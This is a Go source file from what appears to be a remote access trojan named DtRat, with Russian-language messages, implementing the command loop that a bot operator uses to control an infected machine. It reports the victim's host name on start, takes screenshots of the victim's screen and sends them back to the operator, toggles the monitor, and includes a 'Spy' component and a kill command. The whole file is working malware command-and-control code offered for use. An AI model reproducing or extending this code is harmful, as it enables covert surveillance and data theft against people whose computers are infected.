package rat

import (
	"dtrat/bot"
	"dtrat/config"
	"os"

	"github.com/deuterium34/dlog"
)

func (r *Rat) internalClose(reason error) {
	r.Bot.Close()
	r.Engine.Close()
	r.Spy.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(nil)
}

func (r *Rat) Start() {
	dlog.GLogger.Info("Запуск ратника")
	r.Bot.Start()
	go r.commandHandling()
	r.Bot.Send("DtRat Запущен!\n\nХост:%s", r.Config.General.HostName)
}

func (r *Rat) commandHandling() error {
	for true {
		msg, err := r.Bot.Wait()
		if err != nil {
			return err
		}

		r.commandsSwitch(msg)
	}

	return nil
}

func (r *Rat) commandsSwitch(text string) {
	cmd, args := bot.ParseCommand(text)
	switch cmd {
	case "start":
		r.startCmd()
	case "kill":
		r.killCmd()
	case "help":
		r.helpCmd()
	case "screenshot":
		r.screenshotCmd()
	case "monitor":
		r.monitorCmd(args)
	default:
		r.defaultCmd()
	}
}

func (r *Rat) startCmd() {
	r.Bot.Send("Вас приветствует DtRat %s!", config.Version)
}

func (r *Rat) defaultCmd() {
	r.Bot.Send("Неизвестная команда, используйте /help что-бы получить спискок доступных команд и справку по их использованию")
}

func (r *Rat) helpCmd() {
	r.Bot.Send("Доступные команды:\n")
}

func (r *Rat) killCmd() {
	r.Bot.Send("Пока!")
	r.internalClose(nil)
}

func (r *Rat) screenshotCmd() {
	screenshot, err := r.Engine.System.Screenshot()
	defer os.Remove(screenshot)

	if err != nil {
		r.Bot.Send("Ошика: %v", err)
		return
	}

	r.Bot.SendFile(screenshot)
}

func (r *Rat) monitorCmd(args string) {
	if args != "on" && args != "off" {
		r.Bot.Send("Используйте /monitor [on|off]")
		return
	}

	var err error = nil
	switch args {
	case "on":
		err = r.Engine.System.MonitorState(true)
	case "off":
		err = r.Engine.System.MonitorState(false)
	}

	if err != nil {
		r.Bot.Send("Ошибка: %v", err)
		return
	}

	switch args {
	case "on":
		r.Bot.Send("Монитор включен")
		return
	case "off":
		r.Bot.Send("Монитор выключен")
		return
	}
}
